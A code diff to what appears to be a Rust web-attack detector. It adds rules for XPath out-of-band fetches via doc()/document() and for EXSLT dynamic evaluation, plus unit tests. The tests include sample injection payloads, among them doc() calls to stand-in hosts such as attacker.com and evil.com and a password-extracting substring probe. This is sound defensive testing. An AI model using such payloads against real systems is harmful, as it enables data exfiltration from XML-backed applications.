@@ -143,12 +143,119 @@ impl L2Evaluator for XPathEvaluator {
             });
         }
 
+        // 5. XPath 2.0/3.0 out-of-band fetch via doc()/document()
+        let is_word_char = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
+        let oob_candidates = ["fn:document", "document", "fn:doc", "doc"];
+        'oob: for candidate in &oob_candidates {
+            for (pos, _) in lower.match_indices(candidate) {
+                if pos > 0 && is_word_char(lower.as_bytes()[pos - 1]) {
+                    continue;
+                }
+
+                let mut idx = pos + candidate.len();
+                while idx < lower.len() && lower.as_bytes()[idx].is_ascii_whitespace() {
+                    idx += 1;
+                }
+                if idx >= lower.len() || lower.as_bytes()[idx] != b'(' {
+                    continue;
+                }
+                idx += 1;
+                while idx < lower.len() && lower.as_bytes()[idx].is_ascii_whitespace() {
+                    idx += 1;
+                }
+                if idx >= lower.len() || (lower.as_bytes()[idx] != b'\'' && lower.as_bytes()[idx] != b'"') {
+                    continue;
+                }
+                idx += 1;
+
+                let rest = &lower[idx..];
+                if rest.starts_with("http://") || rest.starts_with("https://") || rest.starts_with("//") {
+                    dets.push(L2Detection {
+                        detection_type: "xpath_oob_fetch".into(),
+                        confidence: 0.94,
+                        detail: format!("XPath out-of-band fetch function detected: {}", candidate),
+                        position: pos,
+                        evidence: vec![ProofEvidence {
+                            operation: EvidenceOperation::PayloadInject,
+                            matched_input: decoded[pos..decoded.len().min(pos + 80)].to_string(),
+                            interpretation: "Input invokes XPath doc()/document() to fetch remote content over HTTP(S), enabling out-of-band data exfiltration and SSRF-like behavior.".into(),
+                            offset: pos,
+                            property: "User input must not control XPath document-loading functions (doc/document). External URI resolution in XPath must be disabled or strictly allowlisted.".into(),
+                        }],
+                    });
+                    break 'oob;
+                }
+            }
+        }
+
+        // 6. EXSLT / extension dynamic evaluation functions
+        let dynamic_prefixes = ["dyn", "eval", "saxon", "exsl"];
+        let dynamic_funcs = ["evaluate", "function", "script"];
+        let mut dynamic_hit: Option<(usize, String)> = None;
+
+        'dynamic: for prefix in &dynamic_prefixes {
+            for (pos, _) in lower.match_indices(prefix) {
+                if pos > 0 && is_word_char(lower.as_bytes()[pos - 1]) {
+                    continue;
+                }
+                let mut idx = pos + prefix.len();
+                while idx < lower.len() && lower.as_bytes()[idx].is_ascii_whitespace() {
+                    idx += 1;
+                }
+                if idx >= lower.len() || lower.as_bytes()[idx] != b':' {
+                    continue;
+                }
+                idx += 1;
+                while idx < lower.len() && lower.as_bytes()[idx].is_ascii_whitespace() {
+                    idx += 1;
+                }
+
+                for func in &dynamic_funcs {
+                    if !lower[idx..].starts_with(func) {
+                        continue;
+                    }
+                    let mut fn_idx = idx + func.len();
+                    while fn_idx < lower.len() && lower.as_bytes()[fn_idx].is_ascii_whitespace() {
+                        fn_idx += 1;
+                    }
+                    if fn_idx < lower.len() && lower.as_bytes()[fn_idx] == b'(' {
+                        dynamic_hit = Some((pos, format!("{}:{}", prefix, func)));
+                        break 'dynamic;
+                    }
+                }
+            }
+        }
+
+        if dynamic_hit.is_none() {
+            let xpath_like_context = lower.contains("//") || lower.contains("::") || lower.contains('[');
+            if xpath_like_context && (lower.contains("eval(") || lower.contains("eval (")) {
+                dynamic_hit = lower.find("eval(").or_else(|| lower.find("eval (")).map(|pos| (pos, "eval".into()));
+            }
+        }
+
+        if let Some((pos, dynamic_name)) = dynamic_hit {
+            dets.push(L2Detection {
+                detection_type: "xpath_dynamic_eval".into(),
+                confidence: 0.92,
+                detail: format!("XPath dynamic evaluation detected: {}", dynamic_name),
+                position: pos,
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: decoded[pos..decoded.len().min(pos + 80)].to_string(),
+                    interpretation: "Input uses dynamic XPath evaluation (EXSLT/extension evaluate/function/script), which can execute attacker-controlled XPath expressions and bypass static query constraints.".into(),
+                    offset: pos,
+                    property: "User input must never flow into dynamic XPath evaluation functions. Disable extension functions or strictly constrain expressions.".into(),
+                }],
+            });
+        }
+
         dets
     }
 
     fn map_class(&self, detection_type: &str) -> Option<InvariantClass> {
         match detection_type {
-            "xpath_tautology" | "xpath_function" | "xpath_axis" | "xpath_blind" => {
+            "xpath_tautology" | "xpath_function" | "xpath_axis" | "xpath_blind"
+            | "xpath_oob_fetch" | "xpath_dynamic_eval" => {
                 Some(InvariantClass::XpathInjection)
             }
             _ => None,
@@ -186,6 +293,27 @@ mod tests {
         let eval = XPathEvaluator;
         let dets = eval.detect("' and substring(//user/pass,1,1)='a");
         assert!(dets.iter().any(|d| d.detection_type == "xpath_blind"));
+    }
+
+    #[test]
+    fn test_xpath_oob_doc_fetch() {
+        let eval = XPathEvaluator;
+        let dets = eval.detect("doc(\"http://attacker.com/steal\")");
+        assert!(dets.iter().any(|d| d.detection_type == "xpath_oob_fetch"));
+    }
+
+    #[test]
+    fn test_xpath_document_function() {
+        let eval = XPathEvaluator;
+        let dets = eval.detect("document(\"http://evil.com/\")");
+        assert!(dets.iter().any(|d| d.detection_type == "xpath_oob_fetch"));
+    }
+
+    #[test]
+    fn test_xpath_exslt_dynamic_eval() {
+        let eval = XPathEvaluator;
+        let dets = eval.detect("dyn:evaluate(\"//user/password\")");
+        assert!(dets.iter().any(|d| d.detection_type == "xpath_dynamic_eval"));
     }
 
     #[test]
